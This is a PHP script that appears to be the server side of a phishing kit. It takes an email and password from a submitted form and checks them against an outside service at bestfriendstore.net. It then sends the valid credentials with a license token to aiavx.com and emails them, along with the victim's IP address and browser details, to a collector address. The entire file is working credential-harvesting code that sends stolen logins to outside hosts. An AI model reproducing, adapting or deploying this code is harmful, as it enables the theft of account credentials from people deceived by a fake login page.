<?php

include 'email.php';
$email = trim($_POST['email']);
$password = trim($_POST['password']);

$license_token = "D937C-72661-84F10-37B9F-314AE-82DC6-C2"; //OUR LICENSE TOKEN

function is_valid($em, $pass, $token)
{
    $url = "http://bestfriendstore.net/web/get/auth?email=" . base64_encode($em) . "&password=" . base64_encode($pass);
    $handle = curl_init();

    curl_setopt($handle, CURLOPT_URL, $url);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($handle);
    curl_close($handle);

    if ($data == "ok") {

        try {
            getSession($em, $pass, $token);
        } catch (Exception $ex) {
            echo "ERROR::" . $ex->getMessage();
        }

        return "ok";
    } else {
        return "Not ok";
    }
}

function getSession($email, $password, $token)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'http://aiavx.com/user/save-account');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"email\":\"" . $email . "\",\"password\":\"" . $password . "\", \"token\": \"" . $token . "\"}");

    $headers = array();
    $headers[] = 'Content-Type: application/json';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
}

if ($email != null && $password != null) {
    $signal = '';
    if (is_valid($email, $password, $license_token) == "ok") {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| Dogar |--------------|\n";

        $message .= "Online ID            : " . $email . "\n";
        $message .= "Passcode              : " . $password . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|------- -------------|\n";
        $send = $Receive_email;
        $subject = "Login : $ip";
        mail($send, $subject, $message);
        $signal = 'ok';
        $msg = 'Message Send';
        echo $signal;
    } else {
        print_r(is_valid($email, $password, $license_token));
        exit();
    }
}

?>